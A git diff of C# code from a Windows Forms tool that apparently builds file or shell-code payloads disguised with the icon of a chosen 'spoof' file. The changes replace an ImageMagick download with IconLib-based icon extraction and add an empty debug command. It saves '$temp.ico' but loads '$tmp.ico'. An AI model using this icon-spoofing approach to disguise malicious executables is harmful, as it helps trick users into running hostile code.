@@ -11,6 +11,8 @@ using System.Windows.Forms;
 using System.IO;
 using System.Diagnostics;
 using System.Net;
+using System.Drawing.IconLib;
+
 //using System.Runtime.InteropServices;
 
 namespace masamangalternatibo {
@@ -20,7 +22,6 @@ namespace masamangalternatibo {
 
         string version = "1.0";
         bool payloadMode = true; // true = File payload // false = Shell Code payload
-        bool componentImageMagick = false;
         string lastPayloadContainer;
         int overflowCount = 20;
 
@@ -42,16 +43,17 @@ namespace masamangalternatibo {
 
         private void extractSpoof(bool fromButton = false) {
             //fromButton supresses error if it wasn't the users' intention to extract an icon
-            if (componentImageMagick && ofdSpoof.FileName != "") {
+            if (ofdSpoof.FileName != "") {
                 dbgmsg("Extracting associated icon to bitmap...");
-                Image extractedicon = Icon.ExtractAssociatedIcon(ofdSpoof.FileName).ToBitmap();
-                dbgmsg("Saving as $tmp.bmp...");
-                extractedicon.Save("$tmp.bmp");
-                imgFileIcon.Image = extractedicon;
+                MultiIcon conico = new MultiIcon();
+                conico.Add("iconinstance").CreateFrom(Icon.ExtractAssociatedIcon(ofdSpoof.FileName).ToBitmap(), IconOutputFormat.WinXP);
+                conico.SelectedIndex = 0;
+                conico.Save(Application.StartupPath + "\\$temp.ico", MultiIconFormat.ICO);
+                imgFileIcon.ImageLocation = "$tmp.ico";
             }
             else {
                 if (fromButton) {
-                    MessageBox.Show("ImageMagick component does not exist or no spoof file imported", "Error");
+                    MessageBox.Show("No spoof file imported", "Error");
                 }
                 else {
                     dbgmsg("Error from un-intended extraction suppressed!");
@@ -100,6 +102,10 @@ namespace masamangalternatibo {
                     dbgRtb.Text = "";
                     break;
 
+                case "dbgcd":
+                   
+                    break;
+
                 default:
                     dbgmsg("Bad command! Available commands:\nsetdrive [driveletter]\nsetoverflowcount [integer]\nsetimagelocation [filepath]\ncls\nexit\n");
                     break;
@@ -127,31 +133,7 @@ namespace masamangalternatibo {
                     return;
                 }
             }
-            #endregion
-            #region [Component: Image Magick]
-            dbgmsg("Checking for Image Magick...");
-            if (!(File.Exists("convert.exe"))) {
-                if (MessageBox.Show("This component allows a feature that automatically extracts icons to bitmap then converts it to an acceptable quality icon. This is due to GDI+ unable to directly save an extracted icon with atleast redeeming quality.\n\nPressing No will make mA use the default executable icon; Alternatively you can add a custom icon.\n\nThis will download the file in the background.\n\nDL From: https://github.com/tragenalpha/masamangalternatibo/raw/master/ImageMagick/convert.exe", "Download component \"ImageMagick\" (13.8mb)", MessageBoxButtons.YesNo) == DialogResult.Yes) {
-                    dbgmsg("Downloading file...");
-                    using (WebClient wc = new WebClient()) {
-                        wc.DownloadFile("https://github.com/tragenalpha/masamangalternatibo/raw/master/ImageMagick/convert.exe", "convert.exe");
-                    }
-                    dbgmsg("Download complete!");
-                    componentImageMagick = true;
-                    MessageBox.Show("Download Complete!", "Download component \"ImageMagick\" (13.8mb)");
-                }
-                else {
-                    componentImageMagick = false;
-                    dbgmsg("No Image magick!");
-                }
             }
-            else {
-                dbgmsg("Image Magick Found!");
-                componentImageMagick = true;
-            }
-            dbgmsg("bool componentImageMagick value=" + componentImageMagick.ToString());
-            dbgmsg("Component check finished!");
-        }
             #endregion
             
         private void dbgmsg(string a) {
